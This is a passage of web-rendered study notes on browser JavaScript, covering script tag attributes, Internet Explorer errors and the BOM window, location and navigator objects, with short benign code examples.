d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p></li> <li><p><a href="https://developer.mozilla.org/en-US/docs/Web/API/MutationObserver" target="_blank" rel="noopener noreferrer"><code>MutationObserver</code><span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p></li> <li><p>accessibility: <code>aria-</code></p> <ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></li> <li><p><a href="http://validator.w3.org/" target="_blank" rel="noopener noreferrer">markup validation<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p></li> <li><p>commands in browser console: <code>ctrl+shift+p</code></p></li> <li><p>array-like object</p> <div class="language-typescript extra-class"><pre class="language-typescript"><code><span class="token keyword">interface</span> <span class="token class-name">ArrayLike<span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">&gt;</span></span> <span class="token punctuation">{</span>
    <span class="token keyword">readonly</span> length<span class="token operator">:</span> <span class="token builtin">number</span><span class="token punctuation">;</span>
    <span class="token keyword">readonly</span> <span class="token punctuation">[</span>n<span class="token operator">:</span> <span class="token builtin">number</span><span class="token punctuation">]</span><span class="token operator">:</span> <span class="token constant">T</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><ul><li>with <code>length</code> property</li> <li>typically with bracket notation, <code>item()</code> method</li> <li>some with <code>namedItem()</code> method, with bracket notation</li></ul></li></ol> <h3 id="common-internet-explorer-errors"><a href="#common-internet-explorer-errors" class="header-anchor">#</a> Common Internet Explorer Errors</h3> <ol><li><p>standard mode and quirks mode</p> <ul><li>In computing, quirks mode refers to a technique used by some web browsers for the sake of maintaining backward compatibility with web pages designed for Internet Explorer 5 and earlier,</li> <li>instead of strictly complying with W3C and IETF standards in standards mode.</li></ul></li> <li><p>Operation Aborted</p> <ul><li>occurs when part of the page that isn’t yet fully loaded is being modified</li></ul></li> <li><p>Invalid Character</p> <ul><li>SyntaxError: Invalid or unexpected token</li></ul></li> <li><p>Member Not Found</p> <ul><li>typically occurs when you’re trying to assign a value to an object property after the object has already been destroyed</li> <li>The object must be a COM object to get this specified error message</li></ul></li> <li><p>Unknown Runtime Error</p> <ul><li>occurs when HTML is assigned using the innerHTML or outerHTML property
<ul><li>a block element is being inserted into an inline element</li> <li>or you’re accessing either property on any part of a table</li></ul></li></ul></li> <li><p>The System Cannot Locate the Resource Specified</p> <ul><li>occurs when JavaScript is used to request a resource by URL and the URL is longer than Internet Explorer’s maximum URL length of 2083 characters</li></ul></li></ol> <h2 id="script"><a href="#script" class="header-anchor">#</a> <code>&lt;script&gt;</code></h2> <ol><li><p>attributes</p> <ul><li>global attributes on <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><code>async</code> HTML5 — indicating that the browser should, if possible, execute the script asynchronously
<ul><li>must not be used if the <code>src</code> attribute is absent (i.e. for inline scripts). If it is included in this case it will have no effect</li> <li>Dynamically inserted scripts (using <code>document.createElement()</code>) execute asynchronously by default</li></ul></li> <li><code>defer</code> — Boolean attribute is set to indicate to a browser that the script is meant to be executed after the document has been parsed, but before firing <code>DOMContentLoaded</code> <ul><li>Scripts with the defer attribute will prevent the <code>DOMContentLoaded</code> event from firing until the script has loaded and finished evaluating</li> <li>must not be used if the <code>src</code> attribute is absent (i.e. for inline scripts), in this case it would have no effect</li> <li>To achieve a similar effect for dynamically inserted scripts use <code>async=false</code> instead</li> <li>Scripts with the <code>defer</code> attribute will execute in the order in which they appear in the document</li></ul></li> <li><code>type</code> <ul><li>Omitted or a JavaScript MIME type: For HTML5-compliant browsers this indicates the script is JavaScript</li> <li><code>module</code>: HTML5 For HTML5-compliant browsers the code is treated as a JavaScript module</li></ul></li> <li><code>nomodule</code> <ul><li>Browsers that support <code>type=module</code> ignore any script with a <code>nomodule</code> attribute. That enables you to use module scripts while also providing <code>nomodule</code>-marked fallback scripts for non-supporting browsers</li></ul></li></ul></li> <li><p>synchronous</p> <ul><li>Scripts without async, defer or type=&quot;module&quot; attributes, as well as inline scripts, are fetched and executed immediately, before the browser continues to parse the page</li></ul></li> <li><p>inline scripts for XHTML</p> <ul><li>warp with <code>//&lt;![CDATA[</code>, <code>//]]&gt;</code></li></ul></li></ol> <h2 id="bom"><a href="#bom" class="header-anchor">#</a> BOM</h2> <h3 id="core-the-window-object"><a href="#core-the-window-object" class="header-anchor">#</a> Core: the window object</h3> <ol><li><p>concepts of the <code>window</code> object</p> <ul><li>represents an instance of the browser</li> <li>acting as <code>Global</code> object
<ul><li>all variables and functions declared globally become properties and methods of <code>window</code> with <code>[[Configurable]]</code> attribute set to <code>false</code></li> <li>whereas defining a property directly on window can be <code>delete</code>d</li></ul></li> <li>alias: <code>window.window</code>, <code>top</code>, <code>parent</code>, <code>self</code> and <code>window.self</code> (always), <code>Document.defaultView</code></li></ul></li> <li><p>Window Relationships and Frames</p> <ul><li>frames: <code>&lt;iframe&gt;</code> <ul><li>deprecated: <code>&lt;frameset&gt;</code> and <code>&lt;frame&gt;</code></li></ul></li> <li><code>Window.frames: Window</code> — Returns the window itself, which is an array-like object, listing the direct sub-frames of the current window
<ul><li><code>window.frames[0]</code> is the same thing as <code>document.getElementsByTagName(&quot;iframe&quot;)[0].contentWindow</code></li></ul></li> <li>access frames — bracket notation
<ul><li>by number</li> <li>by <code>name</code> attribute</li> <li><code>parent</code>: points to the current frame’s immediate parent frame
<ul><li>when there are no frames, <code>parent</code> is equal to <code>top</code> (and both are equal to <code>window</code>)</li></ul></li></ul></li> <li>The <code>top</code> object always points to the very top (outermost) frame, which is the browser window itself</li> <li><code>Window.frameElement: Element</code> — the element in which the window is embedded, or null if the element is either top-level or is embedded into a cross origin document
<ul><li>Despite this property's name, it works for documents embedded within any embedding point, including <code>&lt;object&gt;</code>, <code>&lt;iframe&gt;</code>, or <code>&lt;embed&gt;</code></li></ul></li></ul></li> <li><p>Window Position</p> <ul><li><code>screenLeft</code> and <code>screenTop</code> properties
<ul><li>location in relation to the left and top of the screen</li> <li>alternative: <code>screenX</code> and <code>screenY</code> properties</li></ul></li> <li>move
<ul><li><code>moveTo(x, y)</code></li> <li><code>moveBy(x, y)</code>: right and down direction in pixel, minus for the opposite direction</li> <li>may be disabled by the browser</li> <li>apply only to the <code>topmost</code> window object</li></ul></li></ul></li> <li><p>Window Scroll: Working Draft</p> <ul><li><code>Window.scroll(options?: ScrollToOptions): void</code> or <code>Window.scroll(x?: number, y?: number): void</code> <ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/scroll" target="_blank" rel="noopener noreferrer">options<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></li> <li><code>Window.scrollTo()</code>: alias of <code>Window.scroll()</code></li> <li><code>Window.scrollBy(options?: ScrollToOptions): void</code> or <code>Window.scrollBy(x?: number, y?: number): void</code> <ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/scrollBy" target="_blank" rel="noopener noreferrer">options<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>, same as the above</li></ul></li> <li><code>Window.scrollX: number</code> or <code>Window.pageXOffset</code>: read-only
<ul><li>returns the number of pixels that the document is currently scrolled horizontally</li> <li>slightly better support for <code>pageYOffset</code> than for <code>scrollX</code> in older browsers</li></ul></li> <li><code>Window.scrollY: number</code> or <code>Window.pageYOffset</code>: read-only<div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token keyword">var</span> y <span class="token operator">=</span> <span class="token punctuation">(</span>window<span class="token punctuation">.</span>pageYOffset <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span>
  <span class="token operator">?</span> window<span class="token punctuation">.</span>pageYOffset
  <span class="token operator">:</span> <span class="token punctuation">(</span>document<span class="token punctuation">.</span>documentElement <span class="token operator">||</span> document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>parentNode <span class="token operator">||</span> document<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">.</span>scrollTop<span class="token punctuation">;</span>
</code></pre></div></li></ul></li> <li><p>Window Size</p> <ul><li>four properties: <code>innerWidth</code>, <code>innerHeight</code>, <code>outerWidth</code>, and <code>outerHeight</code></li> <li>via DOM:
<ul><li>The <code>document.documentElement.clientWidth</code> and <code>document.documentElement.clientHeight</code> properties</li> <li>IE6 quirks mode: via <code>document.body.clientWidth</code> and <code>document.body.clientHeight</code></li></ul></li> <li>resize<div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token comment">// resize to 100 x 100</span>
window<span class="token punctuation">.</span><span class="token function">resizeTo</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//resize to 200 x 150</span>
window<span class="token punctuation">.</span><span class="token function">resizeBy</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><ul><li><code>resizeTo()</code> expects a new width and height</li> <li><code>resizeBy()</code> expects the differences in each dimension</li> <li>may be disabled by the browser</li> <li>apply only to the <code>topmost</code> window object</li></ul></li></ul></li> <li><p>Navigating and Opening Windows: <code>window.open(url?, target?, features?, replace?)</code></p> <ul><li>four arguments: the URL to load, the window target, a string of features</li> <li>target<div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token comment">//same as &lt;a href=&quot;http://www.xxx.com&quot; target=&quot;topFrame&quot;&gt;&lt;/a&gt;</span>
window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">&quot;http://www.xxx.com/&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;topFrame&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><ul><li>special window names: <code>_self</code>, <code>_parent</code>, <code>_top</code>, or <code>_blank</code></li> <li>the name of a frame</li> <li>Popping Up Windows: When the second argument doesn’t identify an existing window or frame, a new window or tab is created based on a string passed in as the third argument</li></ul></li> <li>features
<ul><li>comma-delimited string of settings</li> <li>ignored when not opening a new window</li> <li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/open#Window%20features" target="_blank" rel="noopener noreferrer">list<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> <ul><li><code>height</code>, <code>width</code>, <code>top</code>, <code>left</code>, <code>location</code>, <code>menubar</code>,</li></ul></li></ul></li> <li>replace
<ul><li>applies only when not opening a new window</li> <li>a Boolean value indicating that the new page should take the place of the currently loaded page in the browser history</li> <li><code>&quot;height=400,width=400,top=10,left=10&quot;</code></li></ul></li> <li>return
<ul><li>a reference to the newly created window</li> <li>has a reference back to the window that opened it via the <code>opener</code> property
<ul><li>defined only on <code>top</code> of the pop-up window</li></ul></li> <li>possible to close the newly opened window: <code>returned_window.close()</code></li> <li>closed window reference still exists but cannot be used other than <code>returned_window.closed</code> check</li></ul></li></ul></li> <li><p>Intervals and Timeouts</p> <ul><li>Timeouts execute some code after a specified amount of time, whereas intervals execute code periodically</li> <li><code>[window.]setTimeout(handler, timeout)</code> <ul><li>handler: the code to execute
<ul><li>usually a function</li> <li>avoid a string, like <code>eval()</code></li></ul></li> <li>timeout: wait time in ms
<ul><li>HTML5: minima 4ms, lower will be converted</li></ul></li> <li><code>this</code>: runs in the global scope, <code>window</code> in non-strict and <code>undefined</code> in strict mode</li> <li>return: a numeric ID for the timeout, for schedule and cancel</li> <li>mechanism: JavaScript is single-threaded. The tasks are executed in the order in which they were added to the queue. JavaScript engine adds this task onto the queue after a set number of milliseconds. If the queue is empty, then that code is executed immediately; if the queue is not empty, the code must wait its turn</li></ul></li> <li><code>clearTimeout(timeoutID)</code></li> <li><code>setInterval()</code>: the same way as timeouts
<ul><li>best to avoid intervals</li></ul></li> <li><code>clearInterval()</code>: the same way</li></ul></li> <li><p>Timeout for Animation</p> <ul><li><code>window.requestAnimationFrame(callback): number</code> <ul><li><code>callback(stamp: DOMHighResTimeStamp)</code> <ul><li>stamp is the time returned from <code>performance.now()</code></li></ul></li> <li>tells the browser that you wish to perform an animation and requests that the browser call a specified function to update an animation before the next repaint</li> <li>callback routine must itself call <code>requestAnimationFrame()</code> if you want to animate another frame at the next repaint</li> <li>The number of callbacks is usually 60 times per second, but will generally match the display refresh rate</li> <li>paused in most browsers when running in background tabs or hidden <code>&lt;iframe&gt;</code>s</li> <li>not IE9 and earlier</li></ul></li> <li><code>window.cancelAnimationFrame(handle: number): void</code> <ul><li>argument is the value returned by <code>requestAnimationFrame()</code></li></ul></li></ul></li> <li><p>System Dialogs</p> <ul><li>synchronous and <a href="https://en.wikipedia.org/wiki/Modal_window" target="_blank" rel="noopener noreferrer">modal<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><code>alert()</code> <ul><li>blocked by browser: If the actively running script produces two or more system dialogs during its execution, each subsequent dialog after the fi rst displays a check box that allows the user to disable any further dialogs until the page reloads</li></ul></li> <li><code>function confirm(message?: string): boolean</code><div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">confirm</span><span class="token punctuation">(</span><span class="token string">'Are you sure?'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre></div></li> <li><code>prompt(message, _default)</code>: user input
<ul><li>message: the text to display to the user</li> <li>_default: the default value for the text box (which can be an empty string (or omitted))</li> <li>return
<ul><li>click OK: string inputted</li> <li>click cancel: <code>null</code></li></ul></li></ul></li> <li><code>find()</code> and <code>print()</code>: the same as what accessed from menu bar
<ul><li>asynchronous</li></ul></li></ul></li> <li><p>UI components</p> <ul><li><code>Window.locationbar</code>, <code>Window.menubar</code>, <code>Window.personalbar</code>, <code>Window.scrollbars</code>, <code>Window.statusbar</code>, <code>Window.toolbar</code></li> <li>visibility can be checked: <code>Window.locationbar.visible</code></li> <li><code>Window.devicePixelRatio</code> — device pixel to CSS pixel, high on mobile</li></ul></li> <li><p>cryptography — <code>Window.crypto: Crypto</code></p> <ul><li><code>Crypto.getRandomValues&lt;T extends TypedArray&gt;(array: T): T</code> — fill a typed array with random numbers (random in its cryptographic meaning)</li> <li><code>Crypto.subtle: SubtleCrypto</code> — providing access to common cryptographic primitives, like hashing, signing, encryption or decryption</li> <li><code>SubtleCrypto</code> — encryption, decryption, digest, sign, verify, key related
<ul><li><a href="https://www.w3.org/TR/WebCryptoAPI/#algorithm-overview" target="_blank" rel="noopener noreferrer">algorithm<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><a href="https://developer.mozilla.org/en-US/docs/Web/API/SubtleCrypto" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><code>TextEncoder</code> for text buffer
<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/TextEncoder" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></li></ul></li></ul></li> <li><p>Cross-document messaging, XDM</p> <ul><li>same-origin policy: Normally, scripts on different pages are allowed to access each other if and only if the pages they originate from share the same protocol, port number, and host</li> <li>a <code>MessageEvent</code> is dispatched at the target window when message posted</li> <li><code>Window.postMessage(message: any, targetOrigin: string, transfer?: any[]): void</code> <ul><li>obtain <code>window</code> reference
<ul><li><code>Window.open()</code> (to spawn a new window and then reference it),</li> <li><code>Window.opener</code> (to reference the window that spawned this one),</li> <li><code>HTMLIFrameElement.contentWindow</code> (to reference an embedded <code>&lt;iframe&gt;</code> from its parent window),</li> <li><code>Window.parent</code> (to reference the parent window from within an embedded <code>&lt;iframe&gt;),</code> or</li> <li><code>Window.frames</code> + an index value (named or numeric)</li></ul></li> <li>message — Data to be sent to the other window. The data is serialized using the structured clone algorithm</li> <li>targetOrigin — Specifies what the origin of targetWindow must be for the event to be dispatched
<ul><li>a URI or <code>&quot;*&quot;</code> for any</li> <li>Failing to provide a specific target discloses the data you send to any interested malicious site</li> <li>posting a message to a page at a <code>file:</code> URL currently requires that the <code>targetOrigin</code> argument be <code>&quot;*&quot;</code></li></ul></li> <li><code>transfer</code> — Is a sequence of <code>Transferable</code> objects that are transferred with the message
<ul><li>The ownership of these objects is given to the destination side and they are no longer usable on the sending side</li> <li>The <code>ArrayBuffer</code>, <code>MessagePort</code> and <code>ImageBitmap</code> types implement this interface</li></ul></li></ul></li> <li>The structured clone algorithm
<ul><li>defined by the HTML5 specification for copying complex JavaScript objects</li> <li>can avoid infinitely traversing cycles</li> <li><code>DATA_CLONE_ERR</code> exception
<ul><li><code>Error</code> and <code>Function</code> objects</li> <li><code>Symbol</code></li> <li>DOM nodes</li></ul></li> <li>Certain parameters of objects are not preserved:
<ul><li>The <code>lastIndex</code> field of <code>RegExp</code> objects is not preserved.</li> <li>Property descriptors, setters, and getters (as well as similar metadata-like features) are not duplicated. For example, if an object is marked read-only using a property descriptor, it will be read-write in the duplicate, since that's the default condition.</li> <li>The prototype chain does not get walked and duplicated</li></ul></li></ul></li> <li>handle the event: see <a href="#message-events">events</a></li> <li>schedules the <code>MessageEvent</code> to be dispatched only after all pending execution contexts have finished
<ul><li>For example, if <code>postMessage()</code> is invoked in an event handler, that event handler will run to completion, as will any remaining handlers for that same event, before the <code>MessageEvent</code> is dispatched</li></ul></li></ul></li></ol> <h3 id="the-location-object"><a href="#the-location-object" class="header-anchor">#</a> The Location Object</h3> <ol><li><p>access</p> <ul><li><code>window.location</code> or <code>document.location</code> or <code>location</code></li></ul></li> <li><p>properties of <code>location</code></p> <ul><li><code>hash</code>
: The URL hash (<code>#</code>)</li> <li><code>host</code>
: The name of the server and port number</li> <li><code>hostname</code>
: <code>host</code> without port</li> <li><code>href</code> <ul><li>The full URL of the currently loaded page</li> <li><code>toString()</code> returns this value</li></ul></li> <li><code>pathname</code>
: The directory and/or filename of the URL</li> <li><code>port</code></li> <li><code>protocol</code>: <code>&quot;http:&quot;</code> or <code>&quot;https:&quot;</code></li> <li><code>search</code> <ul><li>The query string of the URL, beginning with <code>?</code></li> <li>parse query: <code>slice(1)</code>, <code>split('&amp;')</code>, <code>split('=')</code> <ul><li>or <a href="https://developer.mozilla.org/en-US/docs/Web/API/URLSearchParams" target="_blank" rel="noopener noreferrer"><code>URLSearchParams</code><span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> (no IE support)</li></ul></li></ul></li></ul></li> <li><p>Manipulating the Location</p> <ul><li>redirect<div class="language-javascript extra-class"><pre class="language-javascript"><code>location<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token string">&quot;http://www.xxx.com&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
window<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">&quot;http://www.xxx.com&quot;</span><span class="token punctuation">;</span>
location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">&quot;http://www.xxx.com&quot;</span><span class="token punctuation">;</span> <span class="token comment">// most often seen</span>
</code></pre></div></li> <li>change other properties can also modify the currently loaded page</li> <li>Each time a property on <code>location</code> is changed, with the exception of <code>hash</code> , the page reloads with the new URL</li> <li>a new entry in the browser’s history</li> <li>reload: <code>location.reload(forced)</code> <ul><li>without parameter: possibly from cache</li> <li>pass <code>true</code> as forced: force a reload from the server</li></ul></li> <li>navigate without history: <code>location.replace(url)</code> <ul><li>won’t be able to navigate back</li></ul></li></ul></li></ol> <h3 id="the-navigator-object"><a href="#the-navigator-object" class="header-anchor">#</a> The Navigator Object</h3> <ol><li><p><code>Navigator</code></p> <ul><li>represents the state and the identity of the user agent</li> <li>Doesn't inherit any properties, but implements those defined in <code>NavigatorID</code>, <code>NavigatorLanguage</code>, <code>NavigatorOnLine</code>, <code>NavigatorContentUtils</code>, <code>NavigatorStorage</code>, <code>NavigatorStorageUtils</code>, <code>NavigatorConcurrentHardware</code>, <code>NavigatorPlugins</code>, and <code>NavigatorUserMedia</code></li> <li>properties
<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Navigator" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><code>userAgent</code>, <code>language</code>, <code>languages</code></li></ul></li></ul></li> <li><p>plugins — <code>NavigatorPlugins.plugins: PluginArray</code></p> <ul><li><code>PluginArray</code> — array-like object for storing <code>Plugin</code> objects
<ul><li><code>PluginArray.item(index: number): Plugin</code></li> <li><code>PluginArray.namedItem(name: string): Plugin</code></li> <li><code>PluginArray.refresh(reload?: boolean): void</code> — Refreshes all plugins on the current page, optionally reloading documents</li></ul></li> <li><code>Plugin</code> <ul><li><code>Plugin.name</code>, <code>Plugin.filename</code>, <code>Plugin.description</code>, <code>Plugin.version</code></li> <li><code>Plugin.length</code>: The number of MIME types handled by this plug-in</li> <li><code>Plugin.item(index: number): MimeType</code></li> <li><code>Plugin.namedItem(name: string): MimeType</code> — name is a MIME type</li></ul></li> <li><code>NavigatorPlugins.mimeTypes: MimeTypeArray</code> — an array-like object of <code>MimeType</code> objects representing the MIME types recognized by the browser
<ul><li><code>MimeTypeArray.item(index: number): MimeType</code></li> <li><code>MimeTypeArray.namedItem(name: string): MimeType</code> — name is a MIME type</li></ul></li> <li><code>MimeType</code> — information about a MIME type associated with a particular plugin
<ul><li><code>MimeType.type</code>, <code>MimeType.description</code>, <code>MimeType.suffixes</code>, <code>MimeType.enabledPlugin</code></li></ul></li> <li>in IE, plugins are implemented using COM objects, which are identified by unique strings<div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token keyword">function</span> <span class="token function">hasIEPlugin</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">try</span> <span class="token punctuation">{</span>
        <span class="token keyword">new</span> <span class="token class-name">ActiveXObject</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
